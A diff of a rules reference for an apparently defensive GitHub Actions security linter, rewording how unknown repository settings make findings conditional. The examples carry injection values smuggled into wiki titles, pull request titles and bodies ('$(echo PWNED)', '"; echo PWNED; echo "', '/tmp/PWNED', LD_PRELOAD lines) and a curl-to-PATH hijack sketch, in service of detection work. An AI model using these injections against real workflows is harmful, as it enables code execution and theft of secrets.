   - finding kinds: code-injection.wiki, code-injection.env-variable-wiki
   - fact kinds:
-    - repo.wiki-open (provider: repo-setting, assumed value: true)
+    - repo.wiki-open (provider: repo-setting, answer that removes the finding: false)
   - example: wiki-closed.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on gollum and reads the title of a wiki page.
     # reason: the wiki is off, or only collaborators may edit it (GitHub's
     #   default), so no outsider writes the title of a page.
-    # cause: the rule takes the wiki as one anyone may edit unless a file of
-    #   facts says it is not (repo.wiki-open is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that not anyone may edit the
+    #   wiki (repo.wiki-open false), the rule reports the finding. When no source
+    #   answers repo.wiki-open, the finding is conditional.
     # attack-value: github.event.pages[0].title = "$(echo PWNED)"
     # attack-run-behavior: with the wiki off or edited only by collaborators,
     #   the title is one a collaborator wrote; were it the value, the script
@@ -30420,7 +30433,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: code-injection.controlled, code-injection.env-variable
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, a run step echoes the title of
@@ -30434,9 +30447,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.title = "\"; echo PWNED; echo \""
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -30619,7 +30633,7 @@
   - observed: 2026-09-25, runner 2.337.0: a pull_request run took its workflow from the pull request's branch
   - cites:
     - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -30630,7 +30644,7 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
@@ -31800,20 +31814,19 @@
   - consequence: anyone reads it in a public repository, and its history keeps it
   - remedy: revoke the password, and pass a new one from a secret of the repository
   - severity: critical (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: repository-reader
   - preconditions: readable-file, history-keeps
   - true positives:
     - public.remote-callee.yml (workflow, true-positive)
       ```yaml
-      # situation: a job calls the reusable workflow .github/workflows/w.yml of
-      #   the repository example-org/credentials-remote, which the fact
-      #   workflow.definition answers with the workflow of the true positive
-      #   public (public.yml) of the rule, with on: workflow_call in place of the
-      #   on of public.yml. The job passes its secrets with secrets: inherit. In
-      #   the true positive, the job's container credentials write the registry
-      #   password in the workflow file of a public repository (repo.public,
-      #   assumed true).
+      # situation: a job calls the reusable workflow .github/workflows/w.yml of the
+      #   repository example-org/credentials-remote, which the fact
+      #   workflow.definition answers with the workflow of the true positive public
+      #   (public.yml) of the rule, with on: workflow_call in place of the on of
+      #   public.yml. The job passes its secrets with secrets: inherit. In the true
+      #   positive, the job's container credentials write the registry password in
+      #   the workflow file of a public repository (repo.public true).
       # reason: the jobs of a reusable workflow run on the event that started the
       #   run of the calling job, so the reason of the true positive holds: the
       #   password is a literal, hunter2, not a reference to a secret, so it is in
@@ -31833,7 +31846,7 @@
     - public.yml (workflow, true-positive)
       ```yaml
       # situation: the job's container credentials write the registry password in
-      #   the workflow file of a public repository (repo.public, assumed true).
+      #   the workflow file of a public repository (repo.public true).
       # reason: the password is a literal, hunter2, not a reference to a secret,
       #   so it is in the text of the file, in every clone and in every commit
       #   that has the file.
@@ -31890,7 +31903,7 @@
   - consequence: whoever reads the repository reads it, and its history keeps it if the repository is made public
   - remedy: revoke the password, and pass a new one from a secret of the repository
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.public (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.public (provider: repo-setting)
   - attackers: repository-reader
   - preconditions: readable-file, history-keeps
   - true positives:
@@ -32101,15 +32114,16 @@
 - private-repository: a private or internal repository, where the password is credentials.private: whoever may read the repository reads it
   - finding kinds: credentials.public
   - fact kinds:
-    - repo.public (provider: repo-setting, assumed value: true)
+    - repo.public (provider: repo-setting, answer that removes the finding: false)
   - example: private-repository.yml (workflow, false-positive)
     ```yaml
     # situation: the job's container has a password written in the workflow.
     # reason: the repository is private or internal, so the password is
     #   credentials.private, not credentials.public: only those with read access,
     #   every member of the enterprise for an internal one, read it.
-    # cause: the rule takes the repository as public unless a file of facts says
-    #   it is not (repo.public is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the repository is not
+    #   public (repo.public false), the rule reports the finding. When no source
+    #   answers repo.public, the finding is conditional.
     # attack: anyone without access to the repository tries to read the workflow
     #   file to take the password hunter2 written in it.
     # attack-run-behavior: the repository is private or internal, so GitHub
@@ -32131,7 +32145,7 @@
 
 ### threat
 
-- precondition readable-file: the workflow file is read by anyone in a public repository (repo.public, assumed true), and by those with read access, the apps given its contents and whoever has their tokens in a private or internal one, where every member of the enterprise has read access to an internal one; the runner gives the password to docker login as written
+- precondition readable-file: the workflow file is read by anyone in a public repository (repo.public true), and by those with read access, the apps given its contents and whoever has their tokens in a private or internal one, where every member of the enterprise has read access to an internal one; the runner gives the password to docker login as written
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax#jobsjob_idcontainercredentials>
     - <https://github.com/github/docs/blob/8b39dc44a066dda794bfacdd25653ff86324ef21/content/repositories/creating-and-managing-repositories/about-repositories.md>
@@ -32261,7 +32275,7 @@
   - consequence: a flaw that runs the attacker's code in the job, such as an injection or a checkout of their code, gives them a token that pushes, releases and writes what the job may
   - remedy: write permissions on the job with only the scopes it needs, or have a person approve it with an environment that has required reviewers
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.default-token-write (provider: repo-setting, assumed value: true), repo.environment-protected (provider: repo-setting, assumed value: false), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.default-token-write (provider: repo-setting), repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: privileged-job, no-approval, token-writes, flaw-in-job, app-status-check
   - true positives:
@@ -32490,7 +32504,7 @@
   - consequence: a flaw that runs the attacker's code in the job, such as an injection or a checkout of their code, gives them the secrets and what they open past the repository
   - remedy: move the secrets to a job that the attacker's events do not run, or have a person approve it with an environment that has required reviewers
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: privileged-job, no-approval, reads-secrets, flaw-in-job, app-status-check
   - incidents: spotbugs-2024
@@ -33687,16 +33701,17 @@
 - environment-protected: a job whose environment has required reviewers, who approve it before it runs; for the kind dangerous-triggers.secrets of a job that calls a reusable workflow, a job whose called workflow has such an environment on every job that reads the secrets: GitHub passes the secrets only to the runners of the jobs that read the secrets, and the job that calls has no environment of its own (GitHub does not accept environment on a job that calls a reusable workflow)
   - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
   - fact kinds:
-    - repo.environment-protected (provider: repo-setting, assumed value: false)
+    - repo.environment-protected (provider: repo-setting, answer that removes the finding: true)
   - example: environment-protected.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on issues in the environment production, with a
     #   secret.
     # reason: the environment production has required reviewers, who approve the
     #   job before it runs.
-    # cause: the rule takes the environment as one that approves nothing unless
-    #   a file of facts says it has required reviewers
-    #   (repo.environment-protected is assumed false, the worst case).
+    # cause: unless a file of facts or --fact says that the environment has
+    #   required reviewers (repo.environment-protected true), the rule reports the
+    #   finding. When no source answers repo.environment-protected, the finding is
+    #   conditional.
     # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
     # attack-run-behavior: opening the issue queues the job a for the
     #   environment production, which waits for a required reviewer; until one
@@ -33806,15 +33821,16 @@
 - default-token-read: a job that writes no permissions, in a repository whose default token is read
   - finding kinds: dangerous-triggers.token-write
   - fact kinds:
-    - repo.default-token-write (provider: repo-setting, assumed value: true)
+    - repo.default-token-write (provider: repo-setting, answer that removes the finding: false)
   - example: default-token-read.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on issues and writes no permissions.
     # reason: the repository's default token is read, so the token writes
     #   nothing.
-    # cause: the rule takes the default token as one that may write unless a
-    #   file of facts says it is read (repo.default-token-write is assumed true,
-    #   the worst case).
+    # cause: unless a file of facts or --fact says that the default token is read
+    #   (repo.default-token-write false), the rule treats the default token as a
+    #   token that may write and reports the finding. When no source answers
+    #   repo.default-token-write, the finding is conditional.
     # attack-value: github.event.issue.title = "\"; echo PWNED; echo \""
     # attack-run-behavior: opening the issue starts the job a; the script
     #   becomes echo ""; echo PWNED; echo "", so echo PWNED runs as a command,
@@ -34177,7 +34193,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: dangerous-triggers.token-write, dangerous-triggers.secrets
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a step echoes the title of the pull
@@ -34192,9 +34208,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.title = "\"; echo PWNED; echo \""
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -34350,7 +34367,7 @@
 
 ### threat
 
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -34364,9 +34381,9 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
     - <https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets>
-- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected, assumed false: an environment is made with no protection rules)
+- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected false: an environment is made with no protection rules)
   - observed: 2026-09-28, runner 2.337.0: a push after the label ran no labeled run, and ran pull_request_target on synchronize
-- precondition token-writes: the job's token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write, assumed true)
+- precondition token-writes: the job's token may write: a scope other than id-token written write, or no permissions written and the repository's default writes (repo.default-token-write true)
   - cites:
     - <https://docs.github.com/en/actions/concepts/security/github_token>
 - precondition reads-secrets: the job reads secrets other than GITHUB_TOKEN: in the env of the workflow, the job or a step, the outputs of the job, a step's run, with, name, working-directory, timeout-minutes or continue-on-error, the env or the credentials of the job's container or of a service, or, for a job that calls a reusable workflow, the secrets that GitHub passes to the runners of the jobs of the called workflow: with secrets: inherit, the secrets that those jobs read by name, and every secret when one of those jobs reads the secrets context without naming a secret (toJSON(secrets), secrets&#91;&lt;an expression>], secrets.\* (an object filter)); with secrets passed one by one under the secrets: of the calling job, the passed secrets that those jobs read by the names that the calling job gives the secrets. The rule reads a called workflow whose contents the linter has: a workflow that is among the inputs and that the job calls by ./ or \$/, or a reusable workflow of another repository that the fact workflow.definition answers. The runs that showed what GitHub passes called a reusable workflow of the same repository and of another repository of the same organization; the rule assumes the same for a repository of another organization of the same enterprise. When the linter is not given the name of the repository (--repo), a call of the repository's own workflow by owner/repo/path@ref is read as a call of another repository; with the name, the rule does not read the input file for such a call, as the ref of the call may name another version of the file. For a called workflow whose contents the linter does not have, the rule assumes that the jobs of the called workflow read every secret that the job passes (with secrets: inherit, every secret of the job)
@@ -36151,7 +36168,7 @@
   - consequence: an executable of the attacker's in that directory runs for a command the steps after it call by name, and as the shell of their run steps
   - remedy: write a fixed path, not one made of the value: no part of the line may be the attacker's
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: runner-reads-path, path-lookup, attacker-executable, attacker-writes, attacker-event, callers-events, app-status-check
   - true positives:
@@ -36542,7 +36559,7 @@
   - consequence: an executable of the attacker's in that directory runs for a command the steps after it call by name, and as the shell of their run steps
   - remedy: write a fixed path, not one made of the value: no part of the line may be the attacker's
   - severity: high (found from the CVSS metrics below by the table)
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: runner-reads-path, path-lookup, attacker-executable, attacker-event, callers-events, wiki-open
   - true positives:
@@ -36551,11 +36568,11 @@
       # situation: on gollum, a step makes a directory named by the wiki page's
       #   title, downloads a file into it as git, and writes the title to
       #   $GITHUB_PATH; the next step runs git status.
-      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open,
-      #   assumed true), so the page's editor names the directory, and the runner
-      #   adds each line written to $GITHUB_PATH to the front of PATH for the
-      #   steps after it, so git status runs the git in the directory the title
-      #   names, not the system's.
+      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
+      #   true), so the page's editor names the directory, and the runner adds each
+      #   line written to $GITHUB_PATH to the front of PATH for the steps after it,
+      #   so git status runs the git in the directory the title names, not the
+      #   system's.
       # attack-value: github.event.pages[0].title = "/tmp/PWNED"
       # attack-run-behavior: mkdir makes the directory /tmp/PWNED, curl saves the
       #   file at https://example.com//tmp/PWNED as /tmp/PWNED/git, chmod makes it
@@ -38134,14 +38151,15 @@
 - wiki-closed: gollum in a repository whose wiki is off or that only collaborators may edit
   - finding kinds: envpath-injection.wiki
   - fact kinds:
-    - repo.wiki-open (provider: repo-setting, assumed value: true)
+    - repo.wiki-open (provider: repo-setting, answer that removes the finding: false)
   - example: wiki-closed.yml (workflow, false-positive)
     ```yaml
     # situation: the job runs on gollum and reads the title of a wiki page.
     # reason: the wiki is off, or only collaborators may edit it (GitHub's
     #   default), so no outsider writes the title of a page.
-    # cause: the rule takes the wiki as one anyone may edit unless a file of
-    #   facts says it is not (repo.wiki-open is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that not anyone may edit the
+    #   wiki (repo.wiki-open false), the rule reports the finding. When no source
+    #   answers repo.wiki-open, the finding is conditional.
     # attack-value: github.event.pages[0].title = "/tmp/PWNED"
     # attack-run-behavior: a run with this title writes the line /tmp/PWNED to
     #   $GITHUB_PATH, and the steps after it get /tmp/PWNED first in PATH. With
@@ -38485,7 +38503,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: envpath-injection.controlled
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target opened, a step writes the body of the
@@ -38499,9 +38517,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.body = "x\n/tmp/PWNED"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -38692,12 +38711,12 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
     - <https://docs.github.com/en/communities/documenting-your-project-with-wikis/changing-access-permissions-for-wikis>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -38869,7 +38888,7 @@
   - remedy: keep the value after the = and take its line breaks out, or write it as name&lt;&lt;DELIM with a random delimiter
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var-review
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true), repo.merge-commit-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting), repo.merge-commit-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, merged-commit-author, anyone-who-forks
   - preconditions: runner-reads-lines, attacker-writes-lines, attacker-event, callers-events, app-status-check, bash-env
   - true positives:
@@ -39693,7 +39712,7 @@
   - remedy: keep the value after the = and take its line breaks out, or write it as name&lt;&lt;DELIM with a random delimiter
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: env-var-review
-  - fact kinds: repo.wiki-open (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.wiki-open (provider: repo-setting)
   - attackers: wiki-editor
   - preconditions: runner-reads-lines, wiki-title-lines, attacker-event, callers-events, wiki-open, bash-env
   - true positives:
@@ -39701,11 +39720,10 @@
       ```yaml
       # situation: on gollum, a step writes page= and the wiki page's title to
       #   $GITHUB_ENV.
-      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open,
-      #   assumed true), and the runner reads $GITHUB_ENV one line at a time as
-      #   NAME=value, so a line of the title such as LD_PRELOAD=... becomes a
-      #   variable of its own, which changes what the programs of the later steps
-      #   load.
+      # reason: anyone may edit the wiki when it is open to all (repo.wiki-open
+      #   true), and the runner reads $GITHUB_ENV one line at a time as NAME=value,
+      #   so a line of the title such as LD_PRELOAD=... becomes a variable of its
+      #   own, which changes what the programs of the later steps load.
